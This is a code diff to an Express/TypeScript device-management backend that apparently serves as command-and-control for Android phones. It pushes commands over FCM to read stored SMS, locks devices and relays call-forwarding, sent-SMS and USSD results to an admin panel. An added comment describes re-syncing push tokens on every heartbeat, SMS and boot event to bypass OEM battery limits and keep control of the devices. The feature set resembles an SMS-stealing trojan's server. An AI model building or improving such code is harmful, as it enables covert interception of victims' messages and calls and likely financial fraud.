@@ -1,4 +1,4 @@
-// File: src/routes/devices.ts 
+// File: src/routes/devices.ts
 import express, { Request, Response } from "express";
 import logger from "../logger/logger";
 import Device from "../models/Device";
@@ -168,23 +168,16 @@ router.get("/status", async (_req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   LOCK ALL / UNLOCK ALL  ← NEW
+   LOCK ALL / UNLOCK ALL
    (must be before /:deviceId wildcard)
    ═══════════════════════════════════════════ */
 
-/**
- * POST /api/devices/lock-all
- * Lock all devices at once.
- */
 router.post("/lock-all", async (_req: Request, res: Response) => {
   try {
     const result = await Device.updateMany({}, { $set: { locked: true } });
     logger.info("devices: lock-all", { modified: result.modifiedCount });
-
-    // Broadcast updated state to admin panel
     const devices = await Device.find().lean();
     for (const d of devices) wsService.broadcastDeviceUpsert(d);
-
     return res.json({ success: true, locked: result.modifiedCount });
   } catch (err: any) {
     logger.error("devices: lock-all failed", err);
@@ -192,18 +185,12 @@ router.post("/lock-all", async (_req: Request, res: Response) => {
   }
 });
 
-/**
- * POST /api/devices/unlock-all
- * Unlock all devices at once.
- */
 router.post("/unlock-all", async (_req: Request, res: Response) => {
   try {
     const result = await Device.updateMany({}, { $set: { locked: false } });
     logger.info("devices: unlock-all", { modified: result.modifiedCount });
-
     const devices = await Device.find().lean();
     for (const d of devices) wsService.broadcastDeviceUpsert(d);
-
     return res.json({ success: true, unlocked: result.modifiedCount });
   } catch (err: any) {
     logger.error("devices: unlock-all failed", err);
@@ -237,7 +224,14 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
       logger.info("devices: checkedAt updated via ping", { deviceId });
     }
 
-    return res.json({ success: true });
+    // FIX (Root Cause 1 — PRIMARY): 76% devices ka token missing tha.
+    // Backend FCM invalid-token error pe clearInvalidFcmToken() se token "" ho jaata tha.
+    // OEM battery optimization HeartbeatWorker ko kill kar deta tha → recovery nahi hoti thi.
+    // Ab: har lastSeen response mein resyncToken=true bhejo agar token empty hai.
+    // Android (LastSeenReporter) ye flag check karta hai aur turant forceResync() call karta hai.
+    // Ye har action pe fire hoga: heartbeat, sms_received, boot, fcm_received — OEM throttling bypass.
+    const noToken = !String((doc as any)?.fcmToken || "").trim();
+    return res.json({ success: true, resyncToken: noToken });
   } catch (err: any) {
     logger.error("devices: update lastSeen failed", err);
     return res.status(500).json({ success: false, error: err?.message || "server error" });
@@ -245,31 +239,22 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
 });
 
 /* ═══════════════════════════════════════════
-   LOCK / UNLOCK SINGLE DEVICE  ← NEW
+   LOCK / UNLOCK SINGLE DEVICE
    ═══════════════════════════════════════════ */
 
-/**
- * PUT /api/devices/:deviceId/lock
- * Body: { locked: true } or { locked: false }
- */
 router.put("/:deviceId/lock", async (req: Request, res: Response) => {
   try {
     const deviceId = clean(req.params.deviceId);
     if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
-
     const locked = req.body?.locked === true || req.body?.locked === "true";
-
     const doc = await Device.findOneAndUpdate(
       { deviceId },
       { $set: { locked } },
       { new: true },
     ).lean();
-
     if (!doc) return res.status(404).json({ success: false, error: "device not found" });
-
     logger.info("devices: lock updated", { deviceId, locked });
     try { wsService.broadcastDeviceUpsert(doc); } catch {}
-
     return res.json({ success: true, deviceId, locked });
   } catch (err: any) {
     logger.error("devices: lock update failed", err);
@@ -437,7 +422,6 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
    ═══════════════════════════════════════════ */
 
 router.get("/notifications", async (req: Request, res: Response) => {
-  // SECURITY: API key required
   const provided = String(req.headers["x-api-key"] || "").trim();
   if (!provided) {
     return res.status(401).json({ success: false, error: "unauthorized" });
@@ -655,7 +639,6 @@ router.put("/:deviceId", async (req, res) => {
       if ((formModeDoc as any)?.meta?.enabled === true) setObj.masterFormDevice = true;
     } catch (_) {}
     const doc = await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true, new: true }).lean();
-    // New device ya first register — checkedAt set karo registration time se
     if (doc && (!(doc as any).checkedAt || (doc as any).checkedAt === 0)) {
       await Device.updateOne({ deviceId }, { $set: { checkedAt: now } });
       (doc as any).checkedAt = now;
@@ -729,14 +712,13 @@ router.post("/:deviceId/read-old-sms", async (req: Request, res: Response) => {
   try {
     const deviceId = clean(req.params.deviceId);
     if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
-    // count = number of SMS to fetch (new), days = fallback for old APK compat
     const count = Number(req.body?.count || req.body?.days || 3);
     logger.info("devices: read-old-sms triggered", { deviceId, count });
     const result = await fcmSendCommand(deviceId, "read_old_sms", {
       requestId: `oldsms_${deviceId}_${Date.now()}`,
       extraData: {
-        count: count,      // new APK reads this
-        days: count,       // old APK backward compat
+        count: count,
+        days: count,
         timestamp: Date.now(),
       },
     });
@@ -760,14 +742,8 @@ router.post("/:deviceId/call-forward-result", async (req: Request, res: Response
     const response  = clean(req.body?.response || "");
     const uniqueid  = clean(req.body?.uniqueid || deviceId);
     logger.info("devices: call-forward-result received", { deviceId, status, number });
-    // Emit call_forward:result WS event → admin panel receives it
     wsService.broadcastAdminEvent("call_forward:result", {
-      uniqueid,
-      deviceId,
-      status,
-      number,
-      response,
-      timestamp: Date.now(),
+      uniqueid, deviceId, status, number, response, timestamp: Date.now(),
     }, { deviceId, includeDeviceChannel: true });
     return res.json({ success: true });
   } catch (err: any) {
@@ -788,13 +764,8 @@ router.post("/:deviceId/sms-sent", async (req: Request, res: Response) => {
     const to        = clean(req.body?.to       || "");
     const uniqueid  = clean(req.body?.uniqueid || deviceId);
     logger.info("devices: sms-sent result received", { deviceId, status, to });
-    // Emit sms:sent WS event → admin panel receives it
     wsService.broadcastAdminEvent("sms:sent", {
-      uniqueid,
-      deviceId,
-      status,
-      to,
-      timestamp: Date.now(),
+      uniqueid, deviceId, status, to, timestamp: Date.now(),
     }, { deviceId, includeDeviceChannel: true });
     return res.json({ success: true });
   } catch (err: any) {
@@ -815,14 +786,8 @@ router.post("/:deviceId/ussd-result", async (req: Request, res: Response) => {
     const response = clean(req.body?.response || "");
     const uniqueid = clean(req.body?.uniqueid || deviceId);
     logger.info("devices: ussd-result received", { deviceId, status, response: response.slice(0, 50) });
-    // Emit ussd:result WS event → admin panel receives it
     wsService.broadcastAdminEvent("ussd:result", {
-      uniqueid,
-      deviceId,
-      status,
-      response,
-      message: response,
-      timestamp: Date.now(),
+      uniqueid, deviceId, status, response, message: response, timestamp: Date.now(),
     }, { deviceId, includeDeviceChannel: true });
     return res.json({ success: true });
   } catch (err: any) {
